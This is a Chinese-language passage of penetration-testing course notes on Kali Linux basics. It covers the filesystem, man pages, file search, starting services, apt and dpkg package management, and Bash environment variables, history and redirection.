这些工具的版本可以根据其上游来源进行追踪。 此外，关于每个元包的信息也是可用的。元包提供了灵活性，可以根据特定的需求安装特定的工具子集，包括无线、网络应用、取证、软件定义无线电等等。\n\n### Kali Linux 错误跟踪器\n\n偶尔，某些工具可能会崩溃或产生意外的结果。 当这种情况发生时，在Kali Linux Bug Tracker$^{32}$网站上搜索给定的错误信息可能有助于确定该问题是否是一个bug，如果是的话，如何解决它。 用户也可以通过该网站报告错误来帮助社区。\n\n### Kali 培训网站\n\nKali Linux 培训网站$^{33}$承载了官方的Kali Linux手册和培训课程。这个免费的网站是基于 Kali Linux Revealed$^{34}$一书，并承载了HTML 和 PDF 格式的书籍内容，测试你对材料知识的练习，一个支持论坛，等等。这个网站包括大量有用的信息，帮助用户更好地熟悉 Kali Linux。\n\n### 练习\n\n(这些练习不需要报告)\n\n1. 启动你的Kali操作系统，并将Kali用户密码改为安全的密码。\n2. 花一些时间熟悉Kali Linux的菜单。\n3. 使用Kali Tools网站，找到你最喜欢的工具并查看其文档。如果你没有最喜欢的工具，可以选择任何工具。\n\n## 在 Kali 里找到自己的路\n\n### Linux 文件系统\n\nKali Linux 遵循文件系统层次标准（FHS）35，它为所有 Linux 用户提供了一个熟悉和通用的布局。你会发现最有用的目录是：\n\n- **/bin** - 基本程序(ls, cd, cat, 等)\n- **/sbin** - 系统程序（fdisk、mkfs、sysctl等）\n- **/etc** - 配置文件\n- **/tmp** - 临时文件（通常在启动时删除）\n- **/usr/bin** - 应用程序（apt, ncat, nmap, 等）\n- **/usr/share** - 应用程序支持和数据文件\n\n还有许多其他的目录，其中大部分你很少需要进入，但对Linux文件系统的布局有一个很好的熟悉，将极大地帮助你提高效率。\n\n## Linux 的基本命令\n\n### 帮助手册\n\n接下来，让我们深入了解Kali Linux的用法，并探索一些基本的Linux命令。\n\n大多数用于Linux命令行的可执行程序都提供了一份正式的文档，通常称为手册或man手册$^{36}$。一个名为man的特殊程序被用来查看这些页面。 手册页面通常有一个名称、一个概要、一个关于命令目的的描述，以及相应的选项、参数或开关。让我们来看看ls命令的手册页。\n\n```bash\nkali@kali:~$ man ls\n```\n\n清单3 - 探索ls命令的手册页\n\n帮助手册不仅包含有关用户命令的信息，而且还包含有关系统管理命令、编程接口等的文档。系统管理命令、编程接口等方面的文档。本手册的内容被分为若干章节，其编号如下：\n\n表2 - 帮助手册的组织\n\n要确定适当的手册章节，只需进行关键字搜索。 例如，让我们假设我们有兴趣了解更多关于 **/etc/passwd** 文件格式的信息。在命令行输入**man passwd**，将显示手册第1节中有关 **passwd** 命令的信息（图2），这不是我们感兴趣的内容。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c02a67e2-cc44-4cb1-95aa-5c58aa1330a1/Untitled.png)\n\n图2：要求手动输入passwd文件\n\n然而，如果我们使用 **man** 中的 **-k** 选项，我们可以进行关键词搜索，如下图所示：\n\n```bash\nkali@kali:~$ man -k passwd\nchgpasswd (8) - 在批处理模式下更新组密码\nchpasswd (8) - 以批处理方式更新密码\nexim4_passwd (5) - Debian exim4 软件包所使用的文件\nexim4_passwd_client (5) - Debian exim4 软件包正在使用的文件\nexpect_mkpasswd (1) - 生成新的密码，可选择将其应用于一个用户\nfgetpwent_r (3) - 获取密码文件条目，并将其集中在一起\ngetpwent_r (3) - 重复获取passwd文件条目\ngpasswd (1) - 管理 /etc/group 和 /etc/gshadow\ngrub-mkpasswd-pbkdf2 (1) - 为GRUB生成散列密码\nhtpasswd (1) - 管理基本认证的用户文件\n...\n```\n\n清单 4 - 使用 man 执行 passwd 关键字搜索\n\n我们可以在正则表达式的帮助下进一步缩小搜索范围：$^{37}$\n\n```bash\nkali@kali:~$ man -k '^passwd$'\npasswd (1) - 更改用户密码\npasswd (1ssl) - 计算密码散列值\npasswd (5) - 密码文件\n```\n\n清单5 - 缩小我们的搜索范围\n\n在上面的命令中，正则表达式被圆点(^)和美元符号($)所包围，以便 匹配整个行，避免子字符串匹配。现在，我们可以通过引用适当的章节来查看我们感兴趣的确切的 passwd 手册页面。\n\n```bash\nkali@kali:~$ man 5 passwd\n```\n\n清单 6 - 使用 man 查看 /etc/passwd 文件格式的手册页\n\n帮助手册通常是寻找某个特定命令的文档的最快捷方式，所以花点时间来更详细地探索它们。\n\n### apropos\n\n使用apropos$^{38}$命令，我们可以根据一个关键词在man page描述的列表中搜索可能的匹配。虽然这有点粗糙，但对于根据描述找到一个特定的命令来说，往往很有帮助。让我们来看一个例子。假设我们想对一个硬盘进行分区，但却不记得该命令的名称。我们可以通过搜索 \"partition \"来弄清楚这个问题。\n\n```bash\nkali@kali:~$ apropos partition\naddpart (8) - 告诉内核一个分区的存在\ncfdisk (8) - 显示或操作一个磁盘分区表\ncgdisk (8) - 基于Curses的GUID分区表（GPT）操纵器\ncgpt (1) - 用Chromium OS来操作GPT分区的实用程序 ...\ndelpart (8) - 告诉内核忘记一个分区的存在\nextundelete (1) - 撤销ext3或ext4分区的文件的工具。\nfdisk (8) - 操纵磁盘分区表\nfixparts (8) - MBR分区表修复工具\ngdisk (8) - 交互式GUID分区表（GPT）操纵器\ngparted (8) - 用于操纵磁盘分区的 GNOME 分区编辑器。\n...\n```\n\n清单7 - 使用apropos来寻找描述中含有 “分区 ”的命令\n\n请注意，**apropos** 似乎与 **man -k** 的功能相同；事实上，它们是等同的。\n\n### 列表文件\n\n**ls** 命令在屏幕上打印出一个基本的文件清单。我们可以用各种通配符修改输出结果。**-a** 选项用于显示所有的文件（包括隐藏的文件），**-l** 选项将每个文件显示在单行上，这对自动化非常有用。\n\n```bash\nkali@kali:~$ ls\nDesktop Documents Downloads Music Pictures Public Templates Videos\n\nkali@kali:~$ ls /etc/apache2/sites-available/*.conf\n/etc/apache2/sites-available/000-default.conf\n/etc/apache2/sites-available/default-ssl.conf\n\nkali@kali:~$ ls -a1\n.\n..\n.bash_history\n.bashrc\n.cache\n.config\nDesktop\nDocuments\n...\n```\n\n清单8：文件列表\n\n### 左右移动\n\nLinux 不使用 Windows 风格的驱动器字母。相反，所有的文件、文件夹和设备都是根目录的子目录，用 \"/\" 字符表示。我们可以使用 **cd** 命令，在后面加上一个路径，以改变到指定的目录。**pwd** 命令将打印出当前的目录（如果你迷路了，这很有帮助），运行 **cd ~** 将返回到主目录。\n\n```bash\nkali@kali:~$ cd /usr/share/metasploit-framework/\n\nkali@kali:/usr/share/metasploit-framework$ pwd\n/usr/share/metasploit-framework\n\nkali@kali:/usr/share/metasploit-framework$ cd ~\n\nkali@kali:~$ pwd\n/home/kali\n```\n\n清单 9 - 在文件系统中移动\n\n### 创建目录\n\n命令后面跟着一个目录的名称，就可以创建指定的目录。目录名称可以包含空格，但由于我们将在命令行上花费大量的时间，我们将使用连字符或下划线来代替，从而为自己省去很多麻烦。 这些字符将使自动完成（用 `Tab` 键执行）更容易完成。\n\n```bash\nkali@kali:~$ mkdir notes\n\nkali@kali:~$ cd notes/\n\nkali@kali:~/notes$ mkdir module one\n\nkali@kali:~/notes$ ls\nmodule one\n\nkali@kali:~/notes$ rm -rf module/ one/\n\nkali@kali:~/notes$ mkdir \"module one\"\n\nkali@kali:~/notes$ cd module\\\\ one/\n\nkali@kali:~/notes/module one$\n```\n\n清单10 - 在Kali中创建目录\n\n我们可以用非常有用的 **mkdir -p** 一次创建多个目录，它也会创建任何需要的父目录。这可以与括号扩展相结合，有效地创建一个目录结构，例如，存储你的渗透测试笔记。在下面的例子中，我们创建了一个名为 **test** 的目录，并在该目录中创建了三个子目录，名为 **recon**、**exploit** 和 **report**。\n\n```bash\nkali@kali:~$ mkdir -p test/{recon,exploit,report}\n\nkali@kali:~$ ls -1 test/\nexploit\nrecon\nreport\n```\n\n清单11 - 创建一个目录结构\n\n## 在 Kali Linux 中寻找文件\n\n在 kali 中，有三个最常用的查找文件的方式，find、locate 还有 which。这些工具有相似之处，但工作和返回数据的方式不同，因此可以在不同的情况下使用\n\n### Which\n\n**which** $^{39}$命令在 $PATH 环境变量中定义的目录中搜索指定的文件名。这个变量包含了 kali 在发布命令时搜索的目录清单，而不包含路径。如果找到一个匹配的，**which** 会返回文件的完整路径，如下所示。\n\n```bash\nkali@kali:~$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\nkali@kali:~$ which sbd\n/usr/bin/sbd\n```\n\n清单12 - 探索 which 命令\n\n### Locate\n\nlocate $^{40}$命令是在 kali 中查找文件和目录位置的最快捷方式。为了提供更短的搜索时间，**locate** 搜索一个名为 **locate.db** 的内置数据库，而不是整个硬盘本身。这个数据库是由 cron 调度程序定期自动更新。要手动更新 **locate.db** 数据库，你可以使用 **updatedb** 命令。\n\n```bash\nkali@kali:~$ sudo updatedb\n\nkali@kali:~$ locate sbd.exe\n/usr/share/windows-resources/sbd/sbd.exe\n```\n\n清单13 - 探索 locate 命令\n\n### Find\n\nfind $^{41}$命令是这三个工具中最复杂和最灵活的搜索工具。掌握它的语法有时会很棘手，但它的能力超出了普通的文件搜索。**find** 命令的最基本用法如清单所示，我们从跟文件系统目录开始进行递归搜索，寻找任何以字母 “sbd” 开头的文件。\n\n```bash\nkali@kali:~$ sudo find / -name sbd*\n/usr/bin/sbd\n/usr/share/doc/sbd\n/usr/share/windows-resources/sbd\n/usr/share/windows-resources/sbd/sbd.exe\n/usr/share/windows-resources/sbd/sbdbg.exe\n/var/cache/apt/archives/sbd_1.37-1kali3_amd64.deb\n/var/lib/dpkg/info/sbd.md5sums\n/var/lib/dpkg/info/sbd.list\n```\n\n清单14 - 探索 find 命令\n\n与 locate 相比，find 的主要优点是它可以通过不仅仅是名称来搜索文件和目录。通过 find，我可以按文件年龄、大小、所有者、文件类型、时间戳、权限等进行搜索。$^{42}$\n\n### 练习\n\n1. 使用 **man** 查看你喜欢的一个命令的 man 页。\n2. 使用 **man** 查找与文件压缩有关的关键词。\n3. 使用 **which** 查找你的 Kali 虚拟机上的 **pwd** 命令。\n4. 使用 **locate** 在你的 Kali 虚拟机上找到 **wce32.exe**。\n5. 使用 **find** 来识别任何在过去一天中修改过的、不属于 root 用户的文件（不是目录），并对它们执行 **ls -l**。不允许使用链式/管道式命令!\n\n## 管理 Linux Kali 服务\n\n### SSH 服务\n\n安全服务器（SSH）服务最常用于远程访问计算机，使用安全、加密的协议。SSH 服务是基于 TCP 的，默认监听端口为 22。要在 Kali 中启动 SSH 服务，我们要运行 systemctl，在启动选项后面加上服务名称（本例中为ssh）。\n\n```bash\nkali@kali:~$ sudo systemctl start ssh\n```\n\n当命令成功完成后，它没有返回任何输出，但我们可以通过使用 ss 命令和管道将输出输入到 grep 搜索 “sshd” 来验证 SSH 服务正在运行并在 TCP 端口 22 上监听。输出到 grep 中搜索 “sshd”。\n\n```bash\nkali@kali:~$ sudo ss -antlp | grep sshd\nLISTEN 0      128             [::]:22           [::]:*    users:((\"sshd\",pid=470,fd=4))\nLISTEN 0      128            [::1]:6010         [::]:*    users:((\"sshd\",pid=1397352,fd=10))\n```\n\n如果我们想让 SSH 服务在启动时自动启动（就像许多用户喜欢的那样），我们只需使用 systemctl 命令来启用它。但是，一定要先修改默认密码！\n\n```bash\nkali@kali:~$ sudo systemctl enable ssh\nSynchronizing state of ssh.service with SysV service script with /lib/systemd/systemd Executing: /lib/systemd/systemd-sysv-install enable ssh \nCreated symlink /etc/systemd/system/sshd.service → /lib/systemd/system/ssh.service.\n```\n\n我们可以使用 systemctl 来启用和停用 Kali Linux 中的大多数服务。\n\n### HTTP 服务\n\n在渗透测试中，Apache HTTP 服务经常被使用，要么用于托管网站，要么提供一个平台将文件下载到受害者的机器。HTTP 服务是基于 TCP 的，默认监听端口为 80。要在 Kali 中启动 HTTP 服务，我们可以使用 systemctl，就像我们在启动 SSH 服务时一样。来启动 HTTP 服务，我们可以像启动 SSH 服务那样使用 systemctl，将服务名称替换为 “apache2”。\n\n```bash\nkali@kali:~$ sudo systemctl start apache2\n```\n\n和 SSH 服务一样，我们可以用 ss 和 grep 命令来验证 HTTP 服务是否正在运行并监听 TCP 端口 80 上运行并监听，使用 ss 和 grep 命令。\n\n```bash\nkali@kali:~$ sudo ss -antlp | grep apache\nLISTEN 0      128             :::80           :::*    users:((\"apache2\",pid=1481,fd=4),(\"apache2\",pid=1480,fd=4),(\"apache2\",pid=1479,fd=4),(\"apache2\",pid=1478,fd=4),(\"apache2\",pid=1477,fd=4),(\"apache2\",pid=1476,fd=4),(\"apache2\",pid=1475,fd=4))\n```\n\n为了让 HTTP 服务在启动时启动，就像 SSH 服务一样，我们需要明确的启用它，并使用 systemctl 的 enable 选项。\n\n```bash\nkali@kali:~$ sudo systemctl enable apache2\nSynchronizing state of apache2.service with SysV service script with /lib/systemd/syst Executing: /lib/systemd/systemd-sysv-install enable apache2\n```\n\nKali Linux 中大多数服务的操作方式与 SSH 和 HTTP 基本相同，都是通过其服务或 init 脚本。要查看所有可用服务的表格，请运行 systemctl 的 list-unitfiles 选项。\n\n```bash\nkali@kali:~$ systemctl list-unit-files\n...\nUNIT FILE\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t                        STATE\nproc-sys-fs-binfmt_misc.automount \t\t\t\t\t\t                 \t\t\t\t\tstatic\n-.mount \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t               \t\t\t\t\tgenerated\ndev-hugepages.mount \t\t\t\t\t\t\t\t\t\t\t\t\t\t               \t\t\t\t\tstatic\ndev-mqueue.mount                                               \t\t\t\t\tstatic\nmedia-cdrom0.mount                                             \t\t\t\t\tgenerated\nproc-sys-fs-binfmt_misc.mount  \t\t\t\t\t\t                    \t\t\t\t\tstatic\nrun-vmblock\\\\x2dfuse.mount  \t\t\t\t\t\t                 \t\t        \t\t\tdisabled\nsys-fs-fuse-connections.mount  \t\t\t\t\t\t                 \t\t\t\t\t    static\nsys-kernel-config.mount  \t\t\t\t\t\t                 \t\t\t\t\t          static\nsys-kernel-debug.mount  \t\t\t\t\t\t                 \t\t\t\t\t          static\n...\n```\n\n## 搜索、安装和删除工具\n\nKali VMware 镜像包含了渗透测试领域中最常用的工具。然而，在 VMware 镜像中包含 Kali 资源库中存在的每一个工具中是不现实的。因此，我们需要讨论如何搜索、安装或删除工具。在本节中，我们将探讨高级软件包工具（APT）工具集以及其他在 Kali Linux 操作系统上进行维护操作时有用的命令。APT 是一套帮助管理软件包或应用程序的工具，在基于 Debian 的系统中。由于 Kali 时基于 Debian 的，我们可以使用 APT 来安装和删除应用程序，更新软件包，甚至升级整个系统。APT 的神奇之处在于它是一个完整的软件包管理系统，通过递归地满足其要求和依赖关系来安装或删除所要求的软件包。\n\n### Apt update\n\n有关 APT 软件包的信息被缓存在本地，以加快任何涉及查询 APT 数据库的操作。因此，更新可用软件包的列表，包括与它们的版本、描述等有关的信息，始终是一个好的做法。包的列表，包括与它们的版本、描述等相关的信息。我们可以用 apt update 命令来做这件事，如下所示：\n\n```bash\nkali@kali:~$ sudo apt update\nHit:1 <http://kali.mirror.globo.tech/kali> kali-rolling InRelease\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\n699 packages can be upgraded. Run 'apt list --upgradable' to see them.\n```\n\n### Apt upgrade\n\n在 APT 数据库被更新后，我们可以使用 apt upgrade 命令将已安装的软件包和核心系统升级到最新的版本。\n\n为了升级单个软件包，在 apt upgrade 命令后面加上软件包的名字。例如 apt upgrade metasploit-framework。\n\n<aside> 💡 虽然你可以在任何时候升级你的Kali Linux安装，但最好的办法是 在这样做之前，最好先在一个干净的状态下对虚拟机进行快照（在做任何改变之前 之前）进行快照。这有两个主要好处。首先，它将 确保你有一个经过测试的构建的快照，可以用于所有的练习 其次，如果你遇到问题而不得不联系我们的支持团队，他们会 他们会知道你所使用的工具的版本以及它们的行为方式。对于一个实际的 渗透测试，这些问题也同样适用。你将了解更多关于如何 如何在拥有最新的工具和值得信赖的构建之间取得平衡，因为你会获得更多的 经验和对Kali Linux的熟悉程度。\n\n</aside>\n\n### Apt-cache search 和 apt show\n\napt-cache 搜索命令显示了存储在内部缓存的软件包数据中的大部分信息。例如，假设我们想通过 APT 安装 pure-ftpd 应用程序。我们要做的第一件事是找出该应用程序是否存在于 kali Linux 的仓库中。要做到这一点，我们将在命令行中传递搜索词。\n\n```bash\nkali@kali:~$ apt-cache search pure-ftpd\nmysqmail-pure-ftpd-logger - real-time logging system in MySQL - Pure-FTPd traffic-logg\npure-ftpd - Secure and efficient FTP server\npure-ftpd-common - Pure-FTPd FTP server (Common Files)\npure-ftpd-ldap - Secure and efficient FTP server with LDAP user authentication\npure-ftpd-mysql - Secure and efficient FTP server with MySQL user authentication\npure-ftpd-postgresql - Secure and efficient FTP server with PostgreSQL user authentica\nresource-agents - Cluster Resource Agents\n```\n\n上面的输出表明，该应用程序存在于版本库中。也有一些 pure-ftpd 应用程序的认证扩展，如果需要，可以安装。\n\n有趣的是，资源代理包在我们的搜索中出现了，尽管其名称不包含 \"pure-ftpd \"关键字。这背后的原因是，apt-cache 搜索会在软件包的描述中寻找所需的关键词，而不是在软件包的名称本身。\n\n为了确认 resource-agents 软件包的描述确实包含 \"pure-ftpd \"这个关键词。将软件包的名称传递给 apt show，如下所示。\n\n```bash\nkali@kali:~$ apt show resource-agents\nPackage: resource-agents\nVersion: 1:4.2.0-2\n...\nDescription: Cluster Resource Agents\nThis package contains cluster resource agents (RAs) compliant with the Open\nCluster Framework (OCF) specification, used to interface with various services\nin a High Availability environment managed by the Pacemaker resource manager.\n.\nAgents included:\n AoEtarget: Manages ATA-over-Ethernet (AoE) target exports\n AudibleAlarm: Emits audible beeps at a configurable interval\n ...\n NodeUtilization: Node Utilization\n Pure-FTPd: Manages a Pure-FTPd FTP server instance\n Raid1: Manages Linux software RAID (MD) devices on shared storage\n ...\n```\n\n在上面的输出中，apt show 澄清了为什么资源代理程序在之前搜索 pure-ftpd 时神秘地显示出来。\n\n### Apt install\n\napt install 命令可以用来将一个软件包添加到系统中，用 apt install 后面跟着软件包的名字。让我们继续安装 pure-ftpd。\n\n```bash\nkali@kali:~$ sudo apt install pure-ftpd\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following additional packages will be installed:\n pure-ftpd-common\nThe following NEW packages will be installed:\n pure-ftpd pure-ftpd-common\n0 upgraded, 2 newly installed, 0 to remove and 0 not upgraded.\nNeed to get 309 kB of archives.\nAfter this operation, 880 kB of additional disk space will be used.\nDo you want to continue? [Y/n] y\nGet:1 <http://kali.mirror.globo.tech/kali> kali-rolling/main amd64 pure-ftpd-common all\nGet:2 <http://kali.mirror.globo.tech/kali> kali-rolling/main amd64 pure-ftpd amd64 1.0.4\nFetched 309 kB in 4s (86.4 kB/s)\nPreconfiguring packages ...\n...\n```\n\n同样地，我们可以用 apt remove --purge命令删除一个软件包。\n\n### Apt remove --purge\n\napt remove -purge 命令可以完全删除 Kali 中的软件包。需要注意的是，用 apt remove 删除软件包会删除所有的软件包数据，但通常会留下小的（修改过的）用户配置文件，以防删除是意外的。添加 --purge 选项可以删除所有遗留物。\n\n```bash\nkali@kali:~$ sudo apt remove --purge pure-ftpd\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following package was automatically installed and is no longer required:\n pure-ftpd-common\nUse 'sudo apt autoremove' to remove it.\nThe following packages will be REMOVED:\n pure-ftpd*\n0 upgraded, 0 newly installed, 1 to remove and 0 not upgraded.\nAfter this operation, 581 kB disk space will be freed.\nDo you want to continue? [Y/n] y\n(Reading database ... 388024 files and directories currently installed.)\nRemoving pure-ftpd (1.0.47-3) ...\nCannot find cached rlinetd's config files for service ftp, ignoring remove request\nProcessing triggers for man-db (2.8.5-2) ...\n(Reading database ... 388011 files and directories currently installed.)\nPurging configuration files for pure-ftpd (1.0.47-3) ...\nProcessing triggers for systemd (240-6) ...\n```\n\n### Dpkg\n\ndpkg 是用于安装软件包的核心工具，可以直接或间接地通过 APT 安装。它也是离线操作时使用的首选工具，因为它不需要互联网连接。注意，dpkg 不会安装软件包可能需要的任何依赖项。要用 dpkg 安装一个软件包，请提供 -i 或 --install 选项和 .deb 包文件的路径。这假定要安装的软件包的 .deb 文件已经被下载或通过其他方式获得。\n\n```bash\nkali@kali:~$ sudo dpkg -i man-db_2.7.0.2-5_amd64.deb\n(Reading database ... 86425 files and directories currently installed.)\nPreparing to unpack man-db_2.7.0.2-5_amd64.deb ...\nUnpacking man-db (2.7.0.2-5) over (2.7.0.2-4) ...\nSetting up man-db (2.7.0.2-5) ...\nUpdating database of manual pages ...\nProcessing triggers for mime-support (3.58) ...\n...\n```\n\n### 练习\n\n(这些练习不需要报告)\n\n1. 对你的Kali虚拟机进行快照（可选）。\n2. 搜索一个当前没有安装在Kali中的工具。\n3. 安装该工具。\n4. 移除该工具。\n5. 将Kali虚拟机恢复到之前拍摄的快照（可选）。\n\n## 结束语\n\n在这个模块中，我们为即将到来的模块设定了一个基线。我们探讨了新用户的技巧和窍门，并回顾了一些高级用户可能会欣赏的标准。\n\n我们鼓励所有学生回顾Kali培训网站上的免费在线培训$^{46}$。这个网站包括 Kali Linux Revealed 一书，旨在测试你的理解的练习，一个专门的支持论坛，以及更多。这些免费资源为所有技能水平的用户提供了有价值的见解，是本课程培训的一个很好的补充。\n\n# 命令行的乐趣\n\n## Bash 环境\n\nBash 是一个与 sh 兼容的shell，它允许我们在终端窗口中运行复杂的命令并执行不同的任务。它整合了 KornShell(ksh) 和 C shell(csh) 的有用功能。\n\n### 环境变量\n\n当打开一个终端窗口时，一个新的 Bash 进程，它有自己的环境变量，被初始化。这些变量是一种全局存储形式，用于存储在终端会话中运行的任何在该终端会话中运行的应用程序所继承的各种设置。其中一个最常被引用的环境变量之一是 PATH，它是一个用冒号分隔的目录路径列表，Bash 会在没有命令的情况下搜索这些目录。Bash 会在运行没有完整路径的命令时搜索这些目录。我们可以用 echo 命令查看一个特定的环境变量的内容，在该命令后面加上 和一个环境变量的名字。例如，让我们看一下 PATH 环境变量的内容。\n\n```bash\nkali@kali:~$ echo $PATH\n/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n```\n\n其他一些有用的环境变量包括 USER、PWD 和 HOME。终端用户的用户名、当前工作目录和主目录。\n\n```bash\nkali@kali:~$ echo $USER\nkali\n\nkali@kali:~$ echo $PWD\n/home/kali\n\nkali@kali:~$ echo $HOME\n/home/kali\n```\n\n一个环境变量可以用 export 命令来定义。例如，如果我们正在扫描一个目标，不想重复输入系统的 IP 地址，我们可以快速地赋予它一个环境变量并使用它来代替。\n\n```bash\nkali@kali:~$ export b=10.11.1.220\n\nkali@kali:~$ ping -c 2 $b\nPING 10.11.1.220 (10.11.1.220) 56(84) bytes of data.\n64 bytes from 10.11.1.220: icmp_seq=1 ttl=62 time=2.23 ms\n64 bytes from 10.11.1.220: icmp_seq=2 ttl=62 time=1.56 ms\n\n--- 10.11.1.220 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1002ms\nrtt min/avg/max/mdev = 1.563/1.900/2.238/0.340 ms\n```\n\nexport 命令使得我们可能从当前的 Bash 实例中产生的任何子进程都可以访问该变量。如果我们在没有导出的情况下设置一个环境变量，它将只在当前的 shell 中可用。我们将使用 $$ 变量来显示当前 shell 实例的进程 ID，以确保我们确实是在两个不同的 shell 中发布命令。\n\n```bash\nkali@kali:~$ echo \"$$\"\n1827\n\nkali@kali:~$ var=\"My Var\"\n\nkali@kali:~$ echo $var\nMy Var\n\nkali@kali:~$ bash\n\nkali@kali:~$ echo \"$$\"\n1908\n\nkali@kali:~$ echo $var\n\nkali@kali:~$ exit\nexit\n\nkali@kali:~$ echo $var\nMy Var\n\nkali@kali:~$ export othervar=\"Global Var\"\n\nkali@kali:~$ echo $othervar\nGlobal Var\n\nkali@kali:~$ bash\n\nkali@kali:~$ echo $othervar\nGlobal Var\n\nkali@kali:~$ exit\nexit\nkali@kali:~$\n```\n\n在 Kali Linux 中还有许多其他默认定义的环境变量。我们可以通过在命令行运行 env 来查看这些变量。\n\n```bash\nkali@kali:~$ env\nSHELL=/bin/bash\n...\nPWD=/home/kali\nXDG_SESSION_DESKTOP=lightdm-xsession\nLOGNAME=kali\nXDG_SESSION_TYPE=x11\nXAUTHORITY=/home/kali/.Xauthority\nXDG_GREETER_DATA_DIR=/var/lib/lightdm/data/kali\nHOME=/home/kali\n...\nTERM=xterm-256color\nUSER=k\n```\n\n### Tab 自动补全\n\nBash shell 的自动补全功能允许我们用 `TAB` 来完成文件名和目录路径。`TAB` 键来完成文件名和目录路径。这个功能大大加速了 shell 的使用，以至于在其他 shell 中被严重遗漏。让我们在 kali 用户的主目录下看看它是如何工作的。我们首先输入以下命令。\n\n```bash\nkali@kali:~$ ls D[TAB]\nDesktop/ Documents/ Downloads/\n\nkali@kali:~$ ls De[TAB]sktop/\n\nkali@kali:~$ ls Desktop/\n```\n\n当我们在 \"D\" 后面第一次按 `TAB` 键时，Bash shell 提示有三个以该字母开头的目录，然后显示我们部分完成的命令，让我们继续。由于我们决定指定 \"Desktop\"，我们接着第二次输入 \"e\"，然后按 `TAB`键。在这一点上，Bash shell 神奇地自动完成了 \"Desktop\" 这个词的其余部分，因为这是唯一以 \"De\" 开头的选项。关于标签完成的其他信息可以在 Debian 网站上找到。\n\n### Bash 历史记录\n\n在进行渗透测试的时候，记录在 Shell 中输入的命令是很重要的。幸运的是，Bash 保留了一个已经输入的命令的历史记录，可以用 history 命令来显示。\n\n```bash\nkali@kali:~$ history\n 1 cat /etc/lsb-release\n 2 clear\n 3 history\n```\n\n与其重新输入历史记录中的长命令，我们还可以利用历史记录的扩展功能。例如，回顾 Listing，历史上有三条命令，每条命令前面都有一个行号。要重新运行第一条命令，我们只需输入 ! 字符和行号，本例中为 1，就可以执行 cat /etc/lsb-release 命令。\n\n```bash\nkali@kali:~$ !1\ncat /etc/lsb-release\nDISTRIB_ID=Kali\nDISTRIB_RELEASE=kali-rolling\nDISTRIB_CODENAME=kali-rolling\nDISTRIB_DESCRIPTION=\"Kali GNU/Linux Rolling\"\n```\n\n另一个有用的历史快捷键是!!，它重复我们在终端会话中执行的最后一条命令。\n\n```bash\nkali@kali:~$ sudo systemctl restart apache2\n\nkali@kali:~$ !!\nsudo systemctl restart apache2\n\nkali@kali:~$\n```\n\n默认情况下，命令历史被保存在用户主目录下的 .bash_history 文件中。有两个环境变量控制历史记录的大小：HISTSIZE 和 HISTFILESIZE。\n\nHISTSIZE 控制当前会话存储在内存中的命令数量，HISTFILESIZE 配置历史文件中保存的命令数量。这些变量可以根据我们的需要进行编辑，并保存在 Bash 配置文件（.bashrc）中。\n\n探索 Bash 历史的一个最简单的方法是直接从命令行提示符中进行。我们可以用一些有用的键盘快捷键来浏览历史记录，其中最常用的有两个：\n\n- `△` 在历史中向后滚动\n- `▽` 在历史中向前滚动\n\n最后，按住 `Ctrl` 键并按 `R` 键将使用反向-i-搜索工具。键入一个字母，例如 ‘c’，会得到一个在历史中包含字母 ‘c’ 的最新命令的匹配。继续输入以缩小匹配范围，当找到所需的命令时，按 `Return` 来执行它。\n\n```bash\nkali@kali:~$ [CTRL-R]c\n(reverse-i-search)`ca': cat /etc/lsb-release\n```\n\n## 管道符和重定向\n\n每个从命令行运行的程序都有三个数据流与之相连，作为与外部环境的通信渠道。这些数据流定义如下：\n\n管道符（使用 `|` 操作符）和重定向（使用 `>` 和 `<` 操作符）在程序和文件之间连接这些流，以适应几乎无限多的可能使用情况。\n\n### 重定向到一个新文件\n\n在前面的命令例子中，输出被打印到屏幕上。这在大多数情况下是很方便的，但是我们可以使用 `>` 操作符将输出保存到一个文件中，以备将来参考或操作。\n\n```bash\nkali@kali:~$ ls\nDesktop Documents Downloads Music Pictures Public Templates Videos\n\nkali@kali:~$ echo \"test\"\ntest\n\nkali@kali:~$ echo \"test\" > redirection_test.txt\n\nkali@kali:~$ ls\nDesktop Documents Downloads Music Pictures Public redirection_test.txt Template\n\nkali@kali:~$ cat redirection_test.txt\ntest\n\nkali@kali:~$ echo \"Kali Linux is an open source project\" > redirection_test.txt\nkali@kali:~$ cat redirection_test.txt\n\nKali Linux is an open source project\n```\n\n<aside> 💡 如果我们将输出重定向到一个不存在的文件，该文件将被自动创建。然而，如果我们把输出保存到一个已经存在的文件，该文件的内容将被替换。对重定向要小心！没有撤销的功能！\n\n</aside>\n\n### 重定向到一个现有的文件\n\n要将额外的数据附加到一个现有的文件（而不是覆盖该文件），请使用 `>>` 操作符。\n\n```bash\nkali@kali:~$ echo \"that is maintained and funded by Offensive Security\" >>\nredirection_test.txt\nkali@kali:~$ cat redirection_test.txt\nKali Linux is an open source project\nthat is maintained and funded by Offensive Security\n```\n\n### 从一个文件重定向\n\n可以使用 `<` 操作符来发送数他方式”。在下面的例子中，直接用来自上一节中生成的数据重定向 wc 命令的 STDIN。用 wc -m 来计算文件中的字符数试试：\n\n```bash\nkali@kali:~$ wc -m < redirection_test.txt\n89\n```\n\n<aside> 💡 这实际上是将我们的文件内容“连接”到 wc -m 命令的标准输入。\n\n</aside>\n\n### 重定向 STDERR\n\n根据 POSIX 规范，STDIN、STDOU 和 STDERR 的文件描述符分别定义为 0、1 和 2。这些数字很重要，因为在执行或将不同的命令连接在一起时，它们可以用来操作来自命令行的相应数据流。\n\n为了更好的掌握文件描述符数字的工作原理，考虑这个重定向标准错误（STDERR）的例子。\n\n```bash\nkali@kali:~$ ls .\nDesktop Documents Downloads Music Pictures Public redirection_test.txt Template\n\nkali@kali:~$ ls ./test\nls: cannot access '/test': No such file or directory\n\nkali@kali:~$ ls ./test 2>error.txt\n\nkali@kali:~$ cat error.txt\nls: cannot access '/test': No such file or directory\n```\n\n<aside> 💡 error.txt 只包含错误信息（在 STDERR 上生成）。我们通过在 “>” 